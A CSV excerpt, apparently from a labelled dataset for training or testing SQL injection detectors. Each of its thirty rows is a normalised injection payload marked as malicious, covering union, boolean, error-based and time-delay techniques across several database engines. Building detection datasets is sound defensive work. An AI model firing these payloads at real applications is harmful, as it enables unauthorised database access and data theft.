row_index,payload_norm,label,sqli_type_hint
1170,"end and ( ""xksk"" = ""xksk",1,
1171,"-3513%"" union all select 8473,8473#",1,
1172,"select benchmark ( 5000000,md5 ( 0x4c4d6142 ) ) and ( '%' = '",1,
1173,"1' ) and elt ( 3528 = 3566,3566 )",1,
1174,1 ) and 3715 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 3715 = 3715 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ),1,
1175,"1' ) ) ) and char ( 107 ) ||char ( 121 ) ||char ( 97 ) ||char ( 80 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",1,
1176,"1 and 3824 = benchmark ( 5000000,md5 ( 0x76555642 ) ) # igen",1,
1177,"1' ) ) ) and 6055 = ctxsys.drithsx.sn ( 6055, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 6055 = 6055 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ( ( ( 'abcf' like 'abcf",1,
1178,"1' in boolean mode ) union all select null,null,null,null,null,null,null,null,null#",1,
1179,select ( case when ( 5740 = 7636 ) then 5740 else cast ( 1 as int ) / ( select 0 from dual ) end ) from dual--,1,
1180,"-9286"" ) ) as mfxl where 9348 = 9348 union all select 9348#",1,
1181,"1%"" ) ) union all select null,null,null,null,null,null#",1,
1182,1' ) and 7756 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 7756 = 7756 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ( 'lnte' = 'lnte,1,
1183,"1' ) ) union all select null,null,null,null,null,null,null,null,null--",1,
1184,"-8636"" ) ) ) union all select 1821,1821,1821,1821,1821,1821,1821,1821,1821,1821--",1,
1185,"-6940' ) union all select 3042,3042,3042,3042,3042#",1,
1186,"1"" ) as rnjx where 2679 = 2679 and 2388 = benchmark ( 5000000,md5 ( 0x6d457153 ) ) #",1,
1187,1 ) as qgsb where 7600 = 7600 and 2006 = 2006,1,
1188,1' where 4795 = 4795 and 4595 = 4595#,1,
1189,"1"" ) as rnte where 6517 = 6517 and 9254 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",1,
1190,"1"" and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric )",1,
1191,"1 ) as ghew where 6441 = 6441 union all select null,null--",1,
1192,"-2548"" ) ) ) or 5107 = 8049--",1,
1193,1' order by 1#,1,
1194,"1"" ) where 2834 = 2834 ( select ( case when ( 5451 = 5451 ) then regexp_substring ( repeat ( right ( char ( 5451 ) ,0 ) ,500000000 ) ,null ) else char ( 108 ) ||char ( 76 ) ||char ( 112 ) ||char ( 116 ) end ) from information_schema.system_users ) --",1,
1195,"-1963 union all select 6831,6831,6831,6831,6831,6831,6831,6831#",1,
1196,"1"" or ( select * from ( select ( sleep ( 5 ) ) ) ydpu ) and ""pxix"" = ""pxix",1,
1197,"1%' and char ( 107 ) ||char ( 121 ) ||char ( 97 ) ||char ( 80 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",1,
1198,"1' ) ) ) and 6537 = dbms_pipe.receive_message ( chr ( 76 ) ||chr ( 116 ) ||chr ( 117 ) ||chr ( 65 ) ,5 ) and ( ( ( 'xngr' = 'xngr",1,
1199,"-6514 ) ) as pbgg where 6841 = 6841 union all select 6841,6841,6841,6841--",1,
